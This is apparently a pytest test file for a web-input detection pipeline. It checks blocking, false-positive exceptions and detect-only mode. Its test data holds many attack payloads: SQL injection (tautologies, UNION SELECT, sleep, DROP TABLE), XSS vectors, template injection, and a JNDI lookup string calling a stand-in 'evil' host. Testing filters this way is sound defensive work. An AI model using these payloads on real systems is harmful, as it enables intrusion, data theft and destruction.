from dataclasses import replace
from datetime import datetime, timedelta, timezone

import pytest

from conftest import rule_ids
from mpg.detection import (
    Action,
    DetectionPipeline,
    Field,
    InspectionRequest,
    KeywordPrefilter,
    Location,
    Mode,
    RuleException,
)

KST = timezone(timedelta(hours=9))
NOW = datetime(2026, 12, 15, 14, 0, tzinfo=KST)
QNA = "UNION SELECT 문법이 헷갈려요. SELECT name FROM users UNION SELECT email FROM admins 이렇게 쓰면 되나요?"


def test_scenario_a_double_encoded_tautology(pipe):
    v = pipe.inspect_value("admin%2527%20OR%201%3D1--", "query", "username", "/api/login")
    assert v.action is Action.BLOCK
    assert v.risk_score == 10
    assert rule_ids(v) == ["ENC-002", "SQLI-001", "SQLI-003"]


def test_scenario_b_false_positive_then_exception(policy):
    pipe = DetectionPipeline(policy)
    v = pipe.inspect_value(QNA, "json", "content", "/api/qna/posts")
    assert v.action is Action.BLOCK
    assert v.risk_score == 11
    assert rule_ids(v) == ["SQLI-002", "SQLI-007"]

    exc = RuleException("SQLI-002", "/api/qna/posts", "content", NOW + timedelta(days=30))
    pipe2 = DetectionPipeline(replace(policy, version=policy.version + 1, exceptions=(exc,)))
    req = InspectionRequest("POST", "/api/qna/posts", (Field(Location.JSON, "content", QNA),))
    v2 = pipe2.inspect(req, now=NOW)
    assert v2.action is Action.ALLOW
    assert v2.risk_score == 4
    assert [m.rule_id for m in v2.matches if m.excepted] == ["SQLI-002"]

    assert pipe2.inspect(req, now=NOW + timedelta(days=31)).action is Action.BLOCK
    other = InspectionRequest("POST", "/api/login", (Field(Location.JSON, "content", QNA),))
    assert pipe2.inspect(other, now=NOW).action is Action.BLOCK
    other_param = InspectionRequest("POST", "/api/qna/posts", (Field(Location.JSON, "title", QNA),))
    assert pipe2.inspect(other_param, now=NOW).action is Action.BLOCK


def test_exception_does_not_hide_other_attacks_in_same_field(policy):
    exc = RuleException("SQLI-002", "/api/qna/posts", "content", NOW + timedelta(days=30))
    pipe = DetectionPipeline(replace(policy, exceptions=(exc,)))
    req = InspectionRequest(
        "POST", "/api/qna/posts",
        (Field(Location.JSON, "content", "x' UNION SELECT password FROM users--"),),
    )
    v = pipe.inspect(req, now=NOW)
    assert v.action is Action.BLOCK
    assert "SQLI-010" in rule_ids(v)


def test_scenario_c_detect_mode_rule_does_not_block(policy):
    rules = tuple(replace(r, mode=Mode.DETECT) if r.id == "XSS-002" else r for r in policy.rules)
    pipe = DetectionPipeline(replace(policy, rules=rules))
    v = pipe.inspect_value("<svg onload=x>", "json", "content")
    assert v.action is Action.DETECT_ONLY
    assert v.risk_score >= 6


def test_svg_icon_question_is_allowed(pipe):
    v = pipe.inspect_value("<svg width=24 height=24> 아이콘 크기 질문", "json", "content")
    assert v.action is Action.ALLOW
    assert rule_ids(v) == ["XSS-004"]


@pytest.mark.parametrize(
    "value",
    [
        "O'Brien", "D'Angelo", "I said 'hi' and he is nice", "C# 과 Java", "time.sleep(1)",
        "Please select one option", "union station", "50% 할인", "Tom & Jerry's",
        "if (a < b && c > d) return;", "（주）예시상사", "PHP <?php echo 쓰는 법?",
        "It's 'fine' -- don't worry", "(select all that apply)", "'hello' + name() 출력",
        "background: url(data:image/svg+xml;base64,AAAA)",
    ],
)
def test_normal_inputs_allowed(pipe, value):
    assert pipe.inspect_value(value, "json", "content").action is Action.ALLOW


@pytest.mark.parametrize(
    "value, loc, expected",
    [
        ("admin'--", "query", "SQLI-010"),
        ("1' UnIoN/**/SeLeCt 1,2,3--", "query", "SQLI-002"),
        ("1 and sleep(5)", "query", "SQLI-005"),
        ("'; DROP TABLE users;--", "query", "SQLI-004"),
        ("\" OR \"\"=\"", "json", "SQLI-001"),
        ("＜script＞alert(1)＜/script＞", "json", "XSS-001"),
        ("&lt;img src=x onerror=alert(1)&gt;", "json", "XSS-002"),
        ("' autofocus onfocus='alert(1)", "json", "XSS-012"),
        ("${jndi:ldap://evil/a}", "header", "SCR-005"),
        ("{{''.__class__.__mro__[1].__subclasses__()}}", "json", "SCR-009"),
        (r"\x61\x6c\x65\x72\x74\x28\x31\x29", "json", "SCR-003"),
        ("%2525252527 or 1=1", "query", "ENC-001"),
        ("1 OR 'abc'='abc'", "json", "SQLI-011"),
        ("x' AND email IS NULL; --", "json", "SQLI-001"),
        ("1 AND (SELECT 1 FROM (SELECT SLEEP(5))a)", "json", "SQLI-017"),
        ("<a href=\"jav&#x09;ascript:alert(1)\">x</a>", "json", "XSS-003"),
        ("'-alert(1)-'", "json", "XSS-015"),
        ("<link rel=import href=//evil/x.html>", "json", "XSS-013"),
    ],
)
def test_attacks_blocked(pipe, value, loc, expected):
    v = pipe.inspect_value(value, loc, "p")
    assert v.action is Action.BLOCK, rule_ids(v)
    assert expected in rule_ids(v)


def test_duplicate_param_signal(pipe):
    req = InspectionRequest(
        "GET", "/api/products",
        (Field(Location.QUERY, "id", "1"), Field(Location.QUERY, "id", "2")),
        duplicate_params=frozenset({"id"}),
    )
    v = pipe.inspect(req)
    assert v.action is Action.ALLOW
    assert "ENC-008" in rule_ids(v)


def test_request_score_is_max_over_fields(pipe):
    req = InspectionRequest(
        "POST", "/x",
        (Field(Location.JSON, "a", "<svg>"), Field(Location.JSON, "b", "admin' or 1=1--")),
    )
    v = pipe.inspect(req)
    assert v.action is Action.BLOCK
    assert v.risk_score == 8
    assert {m.field_ref for m in v.matches} == {"json.a", "json.b"}


def test_prefilter_narrows_candidates(policy):
    pf = KeywordPrefilter(policy.rules)
    assert pf.candidates("안녕하세요 반갑습니다") == set()
    c = pf.candidates("admin' or 1=1--")
    assert {"SQLI-001", "SQLI-003", "SQLI-010"} <= c
    assert "XSS-001" not in c
